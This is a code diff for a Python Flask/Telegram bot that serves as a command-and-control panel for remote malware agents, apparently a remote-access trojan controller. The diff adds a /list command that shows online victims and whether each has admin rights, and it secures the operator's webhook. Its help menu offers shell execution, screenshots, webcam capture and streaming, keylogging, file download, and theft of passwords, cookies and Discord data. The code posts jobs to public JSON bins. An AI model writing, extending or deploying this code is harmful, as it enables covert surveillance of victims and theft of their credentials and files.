@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Corrected Markdown & Added Error Handler
+# FINAL VERSION - Added /list command and webhook security
 
 import os
 import re
@@ -8,6 +8,7 @@ import uuid
 import httpx
 import asyncio
 import traceback
+import time
 from flask import Flask, request
 
 from telegram import Update
@@ -17,8 +18,10 @@ from telegram.helpers import escape_markdown
 
 # --- Configuration ---
 TOKEN = os.getenv("TELEGRAM_TOKEN")
+SECRET_TOKEN = os.getenv("SECRET_TOKEN") # For webhook security
 JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
 STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
+HEARTBEAT_URL = os.getenv("HEARTBEAT_URL") # For the /list command
 
 # Initialize Flask and Telegram Bot
 app = Flask(__name__)
@@ -27,7 +30,6 @@ ptb_app = Application.builder().token(TOKEN).build()
 # --- Helper Functions ---
 def esc(text):
     """Safely escapes text for Telegram MarkdownV2."""
-    # This is a more robust escape function for MarkdownV2
     escape_chars = r'_*[]()~`>#+-=|{}.!'
     return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', str(text))
 
@@ -56,8 +58,7 @@ async def post_job(target_id, command, args):
         try:
             try:
                 res = await client.get(JOBS_URL, timeout=5)
-                current_jobs = res.json()
-                if not isinstance(current_jobs, list): current_jobs = []
+                current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
             except Exception:
                 current_jobs = []
             
@@ -70,24 +71,74 @@ async def post_job(target_id, command, args):
 
 # --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Displays the help menu with corrected Markdown."""
-    # --- MODIFIED: Corrected the MarkdownV2 formatting ---
+    """Displays the help menu with corrected and organized Markdown."""
     help_text = (
-        "*Vercel Controller Help*\n\n"
-        "This bot uses webhooks to post jobs for remote agents\\.\n\n"
-        "*🎯 Core Controls*\n"
-        "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\n"
-        "`/help` \\- Shows this help message\n\n"
-        "*💣 Destructive Commands*\n"
-        "`/destroy <id> CONFIRM` \\- Removes all traces of the agent\n\n"
-        "*🕵️ Agent Commands \\(Dispatched\\)*\n"
-        "`/info`, `/ss`, `/cam`, `/exec <cmd>`\n"
-        "`/grab <passwords|cookies|discord|all>`\n"
-        "`/startkeylogger`, `/stopkeylogger`\n"
-        "`/livestream`, `/stoplivestream`\n"
-        "`/ls`, `/cd <dir>`, `/pwd`, `/download <path>`"
+        "*AGENT CONTROLLER HELP MENU*\n\n"
+        "Use these commands to manage and control your agents\\.\n\n"
+        "--------------------------------------\n"
+        "*🎯 CORE COMMANDS*\n"
+        "`/list` \\- Show all active agents\n"
+        "`/target <id|all|clear>` \\- Set the active agent\n"
+        "`/help` \\- Display this help menu\n\n"
+        "--------------------------------------\n"
+        "*💻 SYSTEM & INFO*\n"
+        "`/info` \\- Get detailed system information\n"
+        "`/exec <command>` \\- Execute a shell command\n\n"
+        "*👁️ SURVEILLANCE*\n"
+        "`/ss` \\- Take a screenshot\n"
+        "`/cam` \\- Take a webcam photo\n"
+        "`/startkeylogger` \\- Begin capturing keystrokes\n"
+        "`/stopkeylogger` \\- Stop and upload keylog\n\n"
+        "*🔴 LIVE STREAMING*\n"
+        "`/livestream` \\- Start a live screen stream\n"
+        "`/stoplivestream` \\- Stop the screen stream\n"
+        "`/livecam` \\- Start a live webcam stream\n"
+        "`/stoplivecam` \\- Stop the webcam stream\n\n"
+        "*🔑 DATA EXFILTRATION*\n"
+        "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n\n"
+        "*📁 FILE SYSTEM*\n"
+        "`/ls` \\- List files in the current directory\n"
+        "`/cd <directory>` \\- Change directory\n"
+        "`/pwd` \\- Show current directory\n"
+        "`/download <file>` \\- Download a file from the agent\n\n"
+        "--------------------------------------\n"
+        "*💣 DESTRUCTIVE COMMANDS*\n"
+        "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
+
+async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Fetches the list of active agents from the heartbeat bin."""
+    if not HEARTBEAT_URL:
+        await update.message.reply_text("Heartbeat URL is not configured\\.", parse_mode='MarkdownV2')
+        return
+    
+    await update.message.reply_text("⏳ Fetching active agents\\.\\.\\.", parse_mode='MarkdownV2')
+    message = "*AGENT STATUS*\n\n"
+    try:
+        async with httpx.AsyncClient() as client:
+            res = await client.get(HEARTBEAT_URL, timeout=5)
+            agents = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
+        
+        active_agents = []
+        now = time.time()
+        for agent in agents:
+            # Consider agents active if they checked in within the last 60 seconds
+            if now - agent.get("timestamp", 0) < 60:
+                active_agents.append(agent)
+        
+        if not active_agents:
+            message += "_No active agents found\\._"
+        else:
+            for agent in active_agents:
+                is_admin_text = "Admin" if agent.get('is_admin') else "User"
+                agent_user = agent.get('user', 'N/A')
+                message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `({is_admin_text})`\n\n"
+    except Exception as e:
+        message = f"❌ Error fetching agent list: `{esc(str(e))}`"
+
+    await update.message.reply_text(message, parse_mode='MarkdownV2')
+
 
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_id = " ".join(context.args).lower() if context.args else None
@@ -129,17 +180,17 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch job\\.")
 
-# --- NEW: Error Handler for easier debugging ---
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Logs the error and sends a telegram message to notify the developer."""
+    """Logs the error."""
     print(f"An exception was raised while handling an update: {context.error}")
     tb_list = traceback.format_exception(None, context.error, context.error.__traceback__)
     tb_string = "".join(tb_list)
     print(tb_string)
 
 # --- Register handlers ---
-ptb_app.add_error_handler(error_handler) # Register the error handler
+ptb_app.add_error_handler(error_handler)
 ptb_app.add_handler(CommandHandler("help", cmd_help))
+ptb_app.add_handler(CommandHandler("list", cmd_list))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", "pwd", "download"]
@@ -155,6 +206,10 @@ async def process_update_async(update_data):
 
 @app.route('/', methods=['POST'])
 def process_webhook():
+    # SECURE THE WEBHOOK
+    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
+        return 'Unauthorized', 403
+    
     update_data = request.get_json(force=True)
     asyncio.run(process_update_async(update_data))
     return 'OK', 200
